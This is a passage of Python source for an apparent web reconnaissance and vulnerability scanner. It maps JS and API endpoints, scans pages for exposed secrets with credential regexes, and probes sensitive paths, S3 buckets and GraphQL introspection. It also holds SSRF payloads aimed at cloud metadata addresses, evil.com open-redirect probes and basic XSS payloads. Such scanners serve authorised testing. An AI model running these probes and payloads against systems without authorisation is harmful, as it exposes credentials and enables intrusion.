        skill("JS-11: Extracting JS files and API endpoints")
        html_body = self._fetch_text(profile.url, cfg.user_agent, cfg.timeout)
        js_files = self._extract_js_urls(html_body, profile.url)
        profile.js_files = js_files
        ok(f"  Found {len(js_files)} JavaScript files")
        for jf in js_files[:5]:
            info(f"  {jf}")

        # Extract endpoints from each JS file
        all_endpoints = set()
        all_params = set()
        for js_url in js_files[:15]:  # Limit to first 15 to avoid rate issues
            js_content = self._fetch_text(js_url, cfg.user_agent, cfg.timeout)
            if not js_content:
                continue
            for pattern in self.JS_ENDPOINT_PATTERNS:
                matches = re.findall(pattern, js_content, re.I)
                for m in matches:
                    if len(m) > 3 and not m.startswith("//"):
                        all_endpoints.add(m)
            for pattern in self.API_PARAM_PATTERNS:
                matches = re.findall(pattern, js_content)
                for m in matches:
                    if len(m) > 2:
                        all_params.add(m)

        profile.api_endpoints = sorted(all_endpoints)[:50]
        profile.parameters = sorted(all_params)[:100]
        ok(f"  Extracted {len(profile.api_endpoints)} potential endpoints, {len(profile.parameters)} parameters")
        return profile

# ─────────────────────────────────────────────
# TOOL 12: SOURCEMAP ANALYZER
# ─────────────────────────────────────────────
class SourcemapAnalyzer:
    """SKILL-12: Webpack sourcemap discovery and source recovery"""

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SOURCEMAP-12: Probing for exposed webpack sourcemaps")
        findings = []

        for js_url in profile.js_files[:10]:
            map_url = js_url + ".map"
            try:
                import urllib.request
                req = urllib.request.Request(map_url, headers={"User-Agent": cfg.user_agent})
                ctx = ssl._create_unverified_context()
                with urllib.request.urlopen(req, timeout=cfg.timeout, context=ctx) as r:
                    if r.status == 200:
                        content = r.read(50000).decode('utf-8', errors='replace')
                        if '"sources"' in content or '"mappings"' in content:
                            high(f"  SOURCEMAP EXPOSED: {map_url}")
                            findings.append(map_url)

                            try:
                                sm_data = json.loads(content)
                                sources = sm_data.get("sources", [])
                                interesting_src = [s for s in sources if re.search(
                                    r'secret|key|token|password|config|auth|api', s, re.I
                                )]
                                if interesting_src:
                                    high(f"  Sensitive source files in map: {interesting_src[:5]}")
                            except Exception:
                                pass
            except Exception:
                pass

        if findings:
            profile.findings.append(Finding(
                id=f"F-SRC-{profile.host[:8]}-001",
                title="Exposed Webpack Sourcemaps",
                severity="MEDIUM",
                cwe="CWE-540",
                cvss=5.3,
                description=f"Sourcemap files are publicly accessible, exposing original source code.",
                evidence="\n".join(findings),
                reproduction=f"curl -s '{findings[0]}' | python3 -c \"import sys,json; d=json.load(sys.stdin); print('\\n'.join(d.get('sources',[])))\"",
                poc_curl=f"curl -sk '{findings[0]}'",
                category="Information Disclosure",
                remediation="Disable sourcemap generation in production builds."
            ))

        return profile

# ─────────────────────────────────────────────
# TOOL 13: SECRET SCANNER
# ─────────────────────────────────────────────
class SecretScanner:
    """SKILL-13: Credential and secret detection with entropy analysis"""

    SECRET_PATTERNS = {
        "AWS Access Key":        r"AKIA[0-9A-Z]{16}",
        "AWS Secret Key":        r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
        "Google API Key":        r"AIza[0-9A-Za-z\-_]{35}",
        "Google OAuth":          r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
        "GitHub Token":          r"ghp_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82}",
        "Slack Token":           r"xox[baprs]-[0-9a-zA-Z\-]{10,}",
        "Stripe Secret":         r"sk_live_[0-9a-zA-Z]{24}",
        "Stripe Publishable":    r"pk_live_[0-9a-zA-Z]{24}",
        "SendGrid API Key":      r"SG\.[0-9a-zA-Z\-_.]{22}\.[0-9a-zA-Z\-_.]{43}",
        "Twilio SID":            r"AC[0-9a-fA-F]{32}",
        "Zendesk Token":         r"(?i)zendesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]",
        "Freshdesk Key":         r"(?i)freshdesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]",
        "Salesforce Token":      r"(?i)salesforce.{0,20}['\"][0-9a-zA-Z._\-]{30,}['\"]",
        "JWT Token":             r"eyJ[0-9a-zA-Z_\-]+\.[0-9a-zA-Z_\-]+\.[0-9a-zA-Z_\-]+",
        "Bearer Token":          r"[Bb]earer\s+[0-9a-zA-Z\-_.~+/]+=*",
        "Basic Auth":            r"Basic\s+[0-9a-zA-Z+/]+=*",
        "Private Key":           r"-----BEGIN (RSA|EC|PGP|DSA) PRIVATE KEY",
        "Generic Secret":        r"(?i)(secret|api_key|apikey|access_key|auth_token)\s*[=:]\s*['\"][^'\"]{16,}['\"]",
        "Generic Password":      r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{8,}['\"]",
        "Database URL":          r"(?i)(mysql|postgres|mongodb|redis)://[^'\"<\s]+",
        "S3 Bucket":             r"s3://[a-zA-Z0-9\-_.]+|s3\.amazonaws\.com/[a-zA-Z0-9\-_.]+",
        "IDOR Pattern":          r"(?i)/(?:ticket|order|invoice|request|booking|user|account)/(\d+)",
        "Internal IP":           r"\b(?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+\b",
        "Debug Endpoint":        r"(?i)(?:debug|test|dev|localhost|127\.0\.0\.1)(?::\d+)?(?:/[^\s\"']*)?",
        "Email Address":         r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
    }

    def _shannon_entropy(self, data: str) -> float:
        if not data:
            return 0.0
        freq = Counter(data)
        length = len(data)
        return -sum((c / length) * math.log2(c / length) for c in freq.values())

    def _scan_text(self, text: str, source: str) -> List[Dict]:
        found = []
        for name, pattern in self.SECRET_PATTERNS.items():
            for match in re.finditer(pattern, text):
                val = match.group(0)
                entropy = self._shannon_entropy(val)
                # High entropy = likely real secret
                if entropy > 3.0 or name in ["AWS Access Key", "JWT Token", "Private Key"]:
                    found.append({
                        "type": name, "value": val[:80], "source": source,
                        "entropy": round(entropy, 2), "offset": match.start()
                    })
        return found

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SECRETS-13: Scanning for exposed credentials and secrets")
        import urllib.request

        all_secrets = []
        sources_to_scan = [profile.url] + profile.js_files[:10]

        for src_url in sources_to_scan:
            try:
                req = urllib.request.Request(src_url, headers={"User-Agent": cfg.user_agent})
                ctx = ssl._create_unverified_context()
                with urllib.request.urlopen(req, timeout=cfg.timeout, context=ctx) as r:
                    content = r.read(2_000_000).decode('utf-8', errors='replace')
                secrets = self._scan_text(content, src_url)
                all_secrets.extend(secrets)
                for s in secrets:
                    high(f"  SECRET [{s['type']}] in {src_url.split('/')[-1]}: {s['value'][:60]}...")
            except Exception:
                pass

        profile.secrets = all_secrets

        if all_secrets:
            crit = [s for s in all_secrets if s["type"] in
                    ["AWS Access Key", "Private Key", "JWT Token", "GitHub Token", "Stripe Secret"]]
            sev = "CRITICAL" if crit else "HIGH"
            profile.findings.append(Finding(
                id=f"F-SEC-{profile.host[:8]}-001",
                title="Exposed Secrets/Credentials in JavaScript",
                severity=sev,
                cwe="CWE-798",
                cvss=9.8 if sev == "CRITICAL" else 7.5,
                description=f"Found {len(all_secrets)} potential secrets/credentials in JavaScript files.",
                evidence="\n".join(f"{s['type']}: {s['value'][:60]}" for s in all_secrets[:5]),
                reproduction="# Check JS files:\n" + "\n".join(
                    f"curl -s '{s['source']}' | grep -iE 'key|token|secret|password'"
                    for s in all_secrets[:3]
                ),
                poc_curl=f"curl -sk '{all_secrets[0]['source']}' | grep -i '{all_secrets[0]['type'].lower().replace(' ','')}'",
                category="Information Disclosure",
                remediation="Remove all secrets from client-side code. Use environment variables server-side."
            ))

        return profile

# ─────────────────────────────────────────────
# TOOL 14: API MAPPER
# ─────────────────────────────────────────────
class APIMapper:
    """SKILL-14: API endpoint discovery and mapping"""

    API_PATHS = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/rest", "/rest/v1", "/rest/v2",
        "/graphql", "/graphiql", "/playground",
        "/swagger", "/swagger-ui", "/swagger.json", "/openapi.json",
        "/api-docs", "/api/docs", "/docs/api",
        "/api/swagger.json", "/api/openapi.yaml",
        "/v1", "/v2", "/v3",
        "/api/users", "/api/user", "/api/me", "/api/profile",
        "/api/auth", "/api/login", "/api/token", "/api/oauth",
        "/api/admin", "/api/search", "/api/config",
        "/api/tickets", "/api/orders", "/api/bookings",
        "/api/health", "/api/status", "/api/ping",
        "/api/webhook", "/api/webhooks",
        "/.well-known/openid-configuration",
        "/oauth/authorize", "/oauth/token",
        "/api/v1/users", "/api/v1/auth", "/api/v1/search",
        "/api/v2/users", "/api/v2/auth",
    ]

    def _probe(self, url: str, ua: str, timeout: int) -> Tuple[int, str, int]:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": ua,
                "Accept": "application/json,*/*"})
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(2000).decode('utf-8', errors='replace')
                return r.status, body, len(body)
        except urllib.error.HTTPError as e:
            return e.code, "", 0
        except Exception:
            return 0, "", 0

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("API-14: Mapping API endpoints and structure")
        base = profile.url.rstrip("/")
        found = []

        for path in self.API_PATHS:
            url = base + path
            status, body, size = self._probe(url, cfg.user_agent, cfg.timeout)
            if status in [200, 201, 400, 401, 403, 405]:
                found.append({"path": path, "status": status, "size": size})
                color = C.GREEN if status == 200 else C.YELLOW
                print(f"  {color}[{status}]{C.NC} {path} ({size}b)")

                # Check for OpenAPI/Swagger
                if status == 200 and re.search(r'"openapi"|"swagger"|"paths"', body, re.I):
                    ok(f"  OpenAPI/Swagger spec found at {path}!")
                    profile.findings.append(Finding(
                        id=f"F-API-{profile.host[:8]}-001",
                        title="Exposed API Documentation (Swagger/OpenAPI)",
                        severity="INFO",
                        cwe="CWE-200",
                        cvss=5.3,
                        description="API specification is publicly accessible, revealing all endpoints.",
                        evidence=f"URL: {url} | Status: {status}",
                        reproduction=f"curl -s '{url}' | python3 -m json.tool",
                        poc_curl=f"curl -sk '{url}'",
                        category="Information Disclosure",
                        remediation="Restrict API docs to authenticated users or internal network."
                    ))

        profile.api_endpoints.extend([p["path"] for p in found if p["status"] == 200])
        ok(f"  Found {len(found)} API endpoint responses")
        return profile

# ─────────────────────────────────────────────
# TOOL 15: GRAPHQL PROBER
# ─────────────────────────────────────────────
class GraphQLProber:
    """SKILL-15: GraphQL introspection and schema extraction"""

    GRAPHQL_PATHS = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
                     "/query", "/gql", "/playground", "/api/graph"]

    INTROSPECTION_QUERY = json.dumps({
        "query": "{__schema{types{name fields{name type{name kind}}}}}"
    })

    def _probe_graphql(self, url: str, ua: str, timeout: int) -> Optional[Dict]:
        try:
            import urllib.request
            data = self.INTROSPECTION_QUERY.encode()
            req = urllib.request.Request(url, data=data, headers={
                "User-Agent": ua, "Content-Type": "application/json",
                "Accept": "application/json"
            })
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                if r.status == 200:
                    return json.loads(r.read(500000).decode())
        except Exception:
            pass
        return None

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("GRAPHQL-15: Probing for GraphQL endpoints and introspection")
        base = profile.url.rstrip("/")

        for path in self.GRAPHQL_PATHS:
            url = base + path
            result = self._probe_graphql(url, cfg.user_agent, cfg.timeout)
            if result:
                profile.graphql_endpoints.append(url)
                data = result.get("data", {})
                schema = data.get("__schema", {})
                types = schema.get("types", [])
                user_types = [t for t in types if t.get("name") and not t["name"].startswith("__")]
                high(f"  GRAPHQL INTROSPECTION ENABLED: {url}")
                ok(f"  Schema types: {len(user_types)} — {[t['name'] for t in user_types[:10]]}")

                profile.findings.append(Finding(
                    id=f"F-GQL-{profile.host[:8]}-001",
                    title="GraphQL Introspection Enabled",
                    severity="HIGH",
                    cwe="CWE-200",
                    cvss=7.5,
                    description="GraphQL introspection is enabled, exposing the complete API schema.",
                    evidence=f"URL: {url}\nTypes: {[t['name'] for t in user_types[:20]]}",
                    reproduction=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'",
                    poc_curl=f"curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' | python3 -m json.tool",
                    category="GraphQL",
                    remediation="Disable introspection in production. Use query depth limiting."
                ))

        return profile

# ─────────────────────────────────────────────
# TOOL 16: PATH PROBER
# ─────────────────────────────────────────────
class PathProber:
    """SKILL-16: Sensitive file and path enumeration"""

    SENSITIVE_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/config.json", "/config.yaml", "/config.yml", "/settings.json",
        "/.git/HEAD", "/.git/config", "/.gitignore",
        "/backup.zip", "/backup.tar.gz", "/site.tar.gz", "/dump.sql",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/.well-known/security.txt", "/.well-known/change-password",
        "/server-status", "/server-info", "/_status", "/status",
        "/health", "/healthz", "/ping", "/version",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
        "/admin", "/admin/", "/admin/login", "/administrator",
        "/wp-admin", "/wp-login.php", "/wp-config.php",
        "/phpmyadmin", "/pma", "/adminer.php",
        "/api/health", "/api/version", "/api/debug",
        "/.DS_Store", "/Thumbs.db", "/desktop.ini",
        "/error.log", "/debug.log", "/access.log",
        "/package.json", "/package-lock.json", "/yarn.lock",
        "/composer.json", "/composer.lock",
        "/Dockerfile", "/docker-compose.yml", "/Makefile",
        "/.htaccess", "/.htpasswd", "/web.config",
        "/trace.axd", "/elmah.axd", "/ScriptResource.axd",
        "/.well-known/acme-challenge/",
    ]

    def _probe(self, url: str, ua: str, timeout: int) -> Tuple[int, int, str]:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": ua})
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(5000).decode('utf-8', errors='replace')
                return r.status, len(body), body[:200]
        except urllib.error.HTTPError as e:
            return e.code, 0, ""
        except Exception:
            return 0, 0, ""

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PATHS-16: Probing sensitive files and directories")
        base = profile.url.rstrip("/")
        found = []

        for path in self.SENSITIVE_PATHS:
            url = base + path
            status, size, body_preview = self._probe(url, cfg.user_agent, cfg.timeout)
            if status == 200 and size > 0:
                found.append({"path": path, "url": url, "size": size})
                high(f"  FOUND [{status}]: {path} ({size}b)")
                profile.sensitive_paths.append(path)

                # Check for especially sensitive content
                if path in ["/.env", "/config.json", "/.git/config"]:
                    profile.findings.append(Finding(
                        id=f"F-PATH-{profile.host[:8]}-{len(profile.findings):03d}",
                        title=f"Sensitive File Exposed: {path}",
                        severity="CRITICAL" if "env" in path.lower() or "git" in path.lower() else "HIGH",
                        cwe="CWE-538",
                        cvss=9.1 if "env" in path.lower() else 7.5,
                        description=f"Sensitive file '{path}' is publicly accessible.",
                        evidence=f"URL: {url} | Status: {status} | Size: {size}b | Preview: {body_preview[:100]}",
                        reproduction=f"curl -s '{url}'",
                        poc_curl=f"curl -sk '{url}'",
                        category="Information Disclosure",
                        remediation=f"Block access to '{path}' via web server config. Never deploy with these files publicly accessible."
                    ))

        ok(f"  Found {len(found)} accessible sensitive paths")
        return profile

# ─────────────────────────────────────────────
# TOOL 17: S3 BUCKET CHECKER
# ─────────────────────────────────────────────
class S3BucketChecker:
    """SKILL-17: S3 bucket enumeration and permission testing"""

    S3_REGIONS = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1", "me-south-1"]

    def _check_bucket(self, bucket_name: str, timeout: int) -> Dict:
        results = {}
        # Check direct S3 URL
        for region in ["", "us-east-1"]:
            if region:
                url = f"https://{bucket_name}.s3.{region}.amazonaws.com/"
            else:
                url = f"https://{bucket_name}.s3.amazonaws.com/"
            try:
                import urllib.request
                req = urllib.request.Request(url, headers={"User-Agent": "aws-sdk-go/1.0"})
                ctx = ssl._create_unverified_context()
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                    body = r.read(5000).decode('utf-8', errors='replace')
                    results[url] = {"status": r.status, "accessible": True,
                                   "listable": "<ListBucketResult" in body, "body": body[:200]}
            except urllib.error.HTTPError as e:
                results[url] = {"status": e.code, "accessible": e.code != 403,
                               "listable": False, "body": ""}
            except Exception:
                results[url] = {"status": 0, "accessible": False, "listable": False, "body": ""}
        return results

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("S3-17: Enumerating and testing S3 bucket permissions")
        apex = profile.apex
        host = profile.host

        # Generate bucket name candidates
        candidates = [
            apex.replace(".", "-"),
            host.replace(".", "-"),
            f"{apex.replace('.', '-')}-static",
            f"{apex.replace('.', '-')}-assets",
            f"{apex.replace('.', '-')}-media",
            f"{apex.replace('.', '-')}-uploads",
            f"{apex.replace('.', '-')}-backup",
            f"{apex.replace('.', '-')}-prod",
            f"{host.split('.')[0]}-static",
            f"{host.split('.')[0]}-assets",
        ]

        for bucket in candidates:
            results = self._check_bucket(bucket, cfg.timeout)
            for url, res in results.items():
                if res["accessible"]:
                    profile.s3_buckets.append(bucket)
                    if res["listable"]:
                        high(f"  S3 LISTABLE: {url}")
                        profile.findings.append(Finding(
                            id=f"F-S3-{profile.host[:8]}-{len(profile.findings):03d}",
                            title="S3 Bucket Publicly Listable",
                            severity="HIGH",
                            cwe="CWE-732",
                            cvss=7.5,
                            description=f"S3 bucket '{bucket}' allows public listing of objects.",
                            evidence=f"URL: {url} | Status: {res['status']} | Listable: True",
                            reproduction=f"curl -s '{url}'",
                            poc_curl=f"curl -sk '{url}'",
                            category="Cloud Misconfiguration",
                            remediation="Enable S3 Block Public Access. Remove public-read ACL."
                        ))
                    elif res["status"] in [200, 400]:
                        warn(f"  S3 accessible (not listable): {bucket} ({res['status']})")
        return profile

# ─────────────────────────────────────────────
# TOOL 18: SUBDOMAIN TAKEOVER DETECTOR
# ─────────────────────────────────────────────
class SubdomainTakeoverDetector:
    """SKILL-18: Subdomain takeover vulnerability detection"""

    TAKEOVER_FINGERPRINTS = {
        "GitHub Pages":     ["There isn't a GitHub Pages site here"],
        "Heroku":           ["No such app", "herokuapp.com"],
        "Netlify":          ["Not Found - Request ID"],
        "Fastly":           ["Fastly error: unknown domain"],
        "Azure":            ["404 Web Site not found"],
        "AWS S3":           ["NoSuchBucket", "The specified bucket does not exist"],
        "Shopify":          ["Sorry, this shop is currently unavailable"],
        "Tumblr":           ["Whatever you were looking for doesn't currently exist"],
        "WordPress":        ["Do you want to register"],
        "Zendesk":          ["Help Center Closed"],
        "Sendgrid":         ["The provided CNAME does not point"],
        "Pantheon":         ["404 error unknown site"],
        "Surge.sh":         ["project not found"],
        "Unbounce":         ["The requested URL was not found on this server"],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TAKEOVER-18: Detecting subdomain takeover opportunities")
        all_subs = list(set(profile.subdomains + profile.ct_subdomains))
        takeovers = []

        for sub in all_subs[:30]:  # Limit checks
            ip = DNSResolver().resolve(sub)
            if ip == "NXDOMAIN":
                # Dangling DNS
                cname = self._get_cname(sub)
                if cname:
                    warn(f"  Dangling CNAME: {sub} → {cname} (NXDOMAIN)")
                    takeovers.append({"subdomain": sub, "cname": cname, "type": "dangling"})
                continue

            # Check for provider-specific fingerprints
            try:
                url = f"https://{sub}"
                import urllib.request
                req = urllib.request.Request(url, headers={"User-Agent": cfg.user_agent})
                ctx = ssl._create_unverified_context()
                with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                    body = r.read(10000).decode('utf-8', errors='replace')
            except urllib.error.HTTPError as e:
                try:
                    body = e.read(10000).decode('utf-8', errors='replace')
                except Exception:
                    body = ""
            except Exception:
                body = ""

            for provider, signatures in self.TAKEOVER_FINGERPRINTS.items():
                for sig in signatures:
                    if sig.lower() in body.lower():
                        high(f"  TAKEOVER CANDIDATE: {sub} ({provider})")
                        takeovers.append({"subdomain": sub, "provider": provider, "sig": sig})

        if takeovers:
            profile.findings.append(Finding(
                id=f"F-TKO-{profile.host[:8]}-001",
                title="Subdomain Takeover Candidates Found",
                severity="HIGH",
                cwe="CWE-284",
                cvss=8.1,
                description=f"{len(takeovers)} subdomains may be vulnerable to takeover.",
                evidence="\n".join(f"{t.get('subdomain')}: {t.get('provider', t.get('cname', 'unknown'))}" for t in takeovers),
                reproduction="# Claim the orphaned resource and host content on the subdomain",
                poc_curl="# Verify: " + "\n".join(f"curl -sk https://{t.get('subdomain')}/" for t in takeovers[:3]),
                category="Subdomain Takeover",
                remediation="Remove CNAME records pointing to unclaimed external services."
            ))

        return profile

    def _get_cname(self, hostname: str) -> str:
        try:
            import subprocess
            result = subprocess.run(["dig", "+short", "CNAME", hostname],
                                   capture_output=True, text=True, timeout=5)
            return result.stdout.strip()
        except Exception:
            return ""

# ─────────────────────────────────────────────
# TOOL 19: SSRF & OPEN REDIRECT DETECTOR
# ─────────────────────────────────────────────
class SSRFOpenRedirectDetector:
    """SKILL-19: SSRF parameter identification and open redirect testing"""

    SSRF_PARAMS = [
        "url", "redirect", "next", "return", "returnurl", "return_url", "goto",
        "link", "target", "redir", "redirect_uri", "redirect_url", "callback",
        "feed", "host", "fetch", "path", "file", "resource", "src", "dest",
        "destination", "from", "origin", "webhook", "endpoint", "proxy",
        "uri", "view", "site", "page", "ref", "referrer", "image_url", "img_url",
    ]

    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://0.0.0.0/",
    ]

    REDIRECT_PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "/\\/evil.com",
        "/%2F%2Fevil.com",
        "https://evil.com%23.legit.com",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SSRF-19: Identifying SSRF parameters and open redirect vectors")

        # Find SSRF-prone parameters from discovered endpoints and URLs
        ssrf_candidates = []
        all_urls = list(profile.api_endpoints) + list(profile.wayback_urls)[:100]

        for url in all_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in self.SSRF_PARAMS:
                    ssrf_candidates.append({"param": param, "url": url})
                    warn(f"  SSRF-prone param '{param}' in: {url[:80]}")

        # Check redirect parameters in current page
        for param in self.SSRF_PARAMS:
            test_url = f"{profile.url}?{param}=https://evil.com"
            try:
                import urllib.request
                req = urllib.request.Request(test_url, headers={"User-Agent": cfg.user_agent})
                ctx = ssl._create_unverified_context()
                ctx.check_hostname = False
                # Don't follow redirects — check redirect destination
                opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
                opener.addheaders = [("User-Agent", cfg.user_agent)]
                try:
                    resp = opener.open(
                        urllib.request.Request(test_url), timeout=5
                    )
                except urllib.error.HTTPError as e:
                    if e.code in [301, 302, 303, 307, 308]:
                        loc = e.headers.get("Location", "")
                        if "evil.com" in loc:
                            high(f"  OPEN REDIRECT: {test_url} → {loc}")
                            profile.open_redirects.append(test_url)
                except Exception:
                    pass
            except Exception:
                pass

        profile.ssrf_params = [c["param"] for c in ssrf_candidates]

        if ssrf_candidates:
            profile.findings.append(Finding(
                id=f"F-SSRF-{profile.host[:8]}-001",
                title="SSRF-Prone Parameters Identified",
                severity="HIGH",
                cwe="CWE-918",
                cvss=8.6,
                description=f"Found {len(ssrf_candidates)} URL/redirect parameters that may be vulnerable to SSRF.",
                evidence="\n".join(f"{c['param']}: {c['url'][:80]}" for c in ssrf_candidates[:5]),
                reproduction="\n".join(
                    f"curl -s '{c['url'].split('?')[0]}?{c['param']}=http://169.254.169.254/latest/meta-data/'"
                    for c in ssrf_candidates[:3]
                ),
                poc_curl=f"curl -sk '{ssrf_candidates[0]['url'].split('?')[0]}?{ssrf_candidates[0]['param']}=http://169.254.169.254/latest/meta-data/'",
                category="SSRF",
                remediation="Validate URL parameters against an allowlist. Block RFC1918 and metadata service addresses."
            ))

        if profile.open_redirects:
            profile.findings.append(Finding(
                id=f"F-REDIR-{profile.host[:8]}-001",
                title="Open Redirect Vulnerability",
                severity="MEDIUM",
                cwe="CWE-601",
                cvss=6.1,
                description="Redirect parameters accept external URLs without validation.",
                evidence="\n".join(profile.open_redirects[:5]),
                reproduction="\n".join(f"curl -sk -I '{u}'" for u in profile.open_redirects[:3]),
                poc_curl=f"curl -sk -I '{profile.open_redirects[0]}'",
                category="Open Redirect",
                remediation="Validate redirect destinations against an explicit allowlist."
            ))

        return profile

# ─────────────────────────────────────────────
# TOOL 20: IDOR & XSS SURFACE MAPPER
# ─────────────────────────────────────────────
class IDORAndXSSSurfaceMapper:
    """SKILL-20: IDOR patterns and XSS injection point mapping"""

    IDOR_PATTERNS = [
        r"/(\d{4,})",
        r"/(?:user|account|profile|ticket|order|invoice|booking|request|card|id)/(\d+)",
        r"[?&](?:id|user_id|ticket_id|order_id|account_id|booking_id)=(\d+)",
        r"/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}",
    ]

    XSS_ENTRY_POINTS = [
        r'<input[^>]*(?:type=["\'](?:text|search|email|url|tel|password)["\'])[^>]*>',
        r'<textarea[^>]*>',
        r'<form[^>]*>',
        r'<select[^>]*>',
        r'(?:search|q|query|keyword|term|filter)\s*=',
    ]

    XSS_PAYLOADS_BASIC = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("IDOR-20: Mapping IDOR patterns and XSS injection surfaces")

        # Analyze Wayback URLs for IDOR patterns
        idor_candidates = []
        all_urls = list(profile.wayback_urls)[:200] + list(profile.api_endpoints)

        for url in all_urls:
            for pattern in self.IDOR_PATTERNS:
                match = re.search(pattern, url, re.I)
                if match:
                    idor_candidates.append({
                        "url": url,
                        "pattern": pattern,
                        "value": match.group(0),
                        "type": "sequential_id" if match.group(0).isdigit() else "uuid"
                    })
                    break

        if idor_candidates:
            # Deduplicate by URL pattern
            seen_patterns = set()
            unique_idor = []
            for c in idor_candidates:
                key = re.sub(r'\d+', 'N', c["url"])
                if key not in seen_patterns:
                    seen_patterns.add(key)
                    unique_idor.append(c)

            warn(f"  Found {len(unique_idor)} unique IDOR-susceptible URL patterns")
            for c in unique_idor[:5]:
                warn(f"  IDOR candidate: {c['url'][:80]}")

            profile.findings.append(Finding(
                id=f"F-IDOR-{profile.host[:8]}-001",
                title="Insecure Direct Object Reference (IDOR) Patterns",
                severity="HIGH",
                cwe="CWE-639",
                cvss=8.1,
                description=f"Found {len(unique_idor)} URL patterns using sequential/guessable object IDs.",
                evidence="\n".join(f"{c['url'][:80]}" for c in unique_idor[:5]),
                reproduction="\n".join(
                    "# Original: {orig}\n# Try neighbor ID: {nbr}".format(
                        orig=c['url'][:60],
                        nbr=re.sub(r'(\d+)', lambda m: str(int(m.group(0)) + 1), c['url'])[:60],
                    )
                    for c in unique_idor[:2]
                ),
                poc_curl="\n".join(
                    "curl -sk '{url}'".format(
                        url=re.sub(r'(\d+)', lambda m: str(int(m.group(0)) + 1), c['url'])
                    )
                    for c in unique_idor[:2] if re.search(r'\d+', c['url'])
                ),
                category="IDOR",
                remediation="Use unpredictable UUIDs. Enforce server-side ownership checks."
            ))

        # Analyze HTML for XSS entry points
        try:
            import urllib.request
            req = urllib.request.Request(profile.url, headers={"User-Agent": cfg.user_agent})
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=cfg.timeout, context=ctx) as r:
                html_body = r.read(500000).decode('utf-8', errors='replace')

            xss_points = []
            for pattern in self.XSS_ENTRY_POINTS:
                matches = re.findall(pattern, html_body, re.I)
                xss_points.extend(matches[:3])

            # Find forms
            form_matches = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', html_body, re.I)
            profile.forms = [{"action": m} for m in form_matches]

            if xss_points:
                ok(f"  Found {len(xss_points)} potential XSS injection points")
                if profile.forms:
                    ok(f"  Found {len(profile.forms)} forms: {[f['action'][:40] for f in profile.forms[:3]]}")
                    profile.findings.append(Finding(
                        id=f"F-XSS-{profile.host[:8]}-001",
                        title="XSS Injection Surface Identified",
                        severity="MEDIUM",
                        cwe="CWE-79",
                        cvss=6.1,
                        description=f"Found {len(xss_points)} input points and {len(profile.forms)} forms that require XSS testing.",
                        evidence=f"Forms: {form_matches[:3]}\nInputs: {xss_points[:3]}",
                        reproduction="# Test each input field with:\n" + "\n".join(
                            f"<payload>: {p}" for p in self.XSS_PAYLOADS_BASIC[:3]
                        ),
                        poc_curl=f"# Manual test required — open browser devtools at {profile.url}",
                        category="XSS Surface",
                        remediation="Encode all output. Implement strict CSP. Validate input server-side."
                    ))
        except Exception:
            pass

        return profile

# ─────────────────────────────────────────────
# REPORTER
# ─────────────────────────────────────────────
class Reporter:
    """SKILL-30: Multi-format report generation (JSON, Markdown, HTML, CSV)"""

    SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    SEVERITY_COLOR = {
        "CRITICAL": "#dc3545", "HIGH": "#fd7e14",
        "MEDIUM": "#ffc107", "LOW": "#17a2b8", "INFO": "#6c757d"
    }

    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.ts = datetime.now().strftime("%Y%m%d_%H%M%S")

